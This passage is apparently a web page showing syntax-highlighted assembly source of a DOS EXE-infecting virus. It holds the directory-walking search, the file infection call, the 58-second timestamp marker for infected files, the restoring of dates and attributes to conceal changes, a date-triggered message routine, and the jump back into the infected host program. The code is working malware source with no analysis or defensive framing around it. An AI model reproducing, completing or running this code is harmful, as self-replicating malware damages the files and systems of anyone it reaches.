</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">diskdtaofs</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; hold DISK DTA</span><span class="sc0">


</span><span class="sc5">@dirloop3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filedata</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; set new FILE DTA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filespec</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; find first FILE</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@transform</span><span class="sc0">                            </span><span class="sc1">; if find then transform it</span><span class="sc0">

</span><span class="sc5">@nextexe</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; find next EXE</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@transform</span><span class="sc0">


</span><span class="sc5">go_out</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@back</span><span class="sc0">                       </span><span class="sc1">; finished with current dir</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">rootdir</span><span class="sc0">          </span><span class="sc1">; if no EXE found then change DIRECTORY</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; now in ROOT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">diskdtaseg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">diskdtaofs</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; set DISK DTA again</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@dirloop</span><span class="sc0">                              </span><span class="sc1">; go to search</span><span class="sc0">

</span><span class="sc5">@bus</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">currentdir</span><span class="sc0">
     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@bus1</span><span class="sc0">

</span><span class="sc5">@transform</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; get FILE DTA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempseg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tempofs</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                       </span><span class="sc1">; hold FILE DTA</span><span class="sc0">


</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filedata</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]+</span><span class="sc5">filedate</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_date</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">]+</span><span class="sc5">filetime</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_time</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; store original date,time</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1dh</span><span class="sc0">                                </span><span class="sc1">; if time = 58 sec</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@fixup</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; get original attributes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_attr</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">            </span><span class="sc1">; store original attributes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; clear attributes</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@fixup</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@doit</span><span class="sc0">                                 </span><span class="sc1">; if not infected then</span><span class="sc0">
                                          </span><span class="sc1">; I'll do it</span><span class="sc0">
</span><span class="sc5">@fixup</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc5">tempseg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">tempofs</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; recover old FILE DTA</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@nextexe</span><span class="sc0">                              </span><span class="sc1">; go to search</span><span class="sc0">

</span><span class="sc5">@doit</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                                 </span><span class="sc1">; DS:DX = filename</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                              </span><span class="sc1">; read/write</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; open file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infectfile</span><span class="sc0">                           </span><span class="sc1">; INFECT FILE</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_time</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1111111111100000b</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0000000000011101b</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_date</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                              </span><span class="sc1">; recover old date, and set 58 sec</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">orig_attr</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filedata</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; recover old attributes</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; close file</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,[</span><span class="sc5">tempseg</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">tempofs</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; recover old FILE DTA</span><span class="sc0">
</span><span class="sc1">;jmp go_out                               ; go to search one more EXE</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@fixup</span><span class="sc0">                                </span><span class="sc1">; go to search one more EXE</span><span class="sc0">

</span><span class="sc5">@bus1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@bus2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">showm</span><span class="sc0">
</span><span class="sc5">@bus2</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24es</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old24bx</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">                               </span><span class="sc1">; restore old int24h</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@dos</span><span class="sc0">                                   </span><span class="sc1">; if .COM working</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldES</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">             </span><span class="sc1">; recover old ES in DX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                    </span><span class="sc1">; ES=DX</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                    </span><span class="sc1">; DS=ES=DX</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileCS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">patch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; Set SEGM in JMP</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">FileIP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">patch</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">; Set OFFS in JMP</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                                 </span><span class="sc1">; Clear Registers</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSS</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">OldSP</span><span class="sc4">]+</span><span class="sc8">bp</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">patch</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                </span><span class="sc1">; JMP OldCS:OldIP</span><span class="sc0">
</span><span class="sc5">@dos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4C00h</span><span class="sc0">                              </span><span class="sc1">; ALL DONE</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21h</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------</span><span class="sc0">
</span><span class="sc5">_end</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">main</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">vir_end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">vir_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc0">
</span><span class="sc5">enc_size</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vir_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">body</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0"> </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span></div></body>
</html>
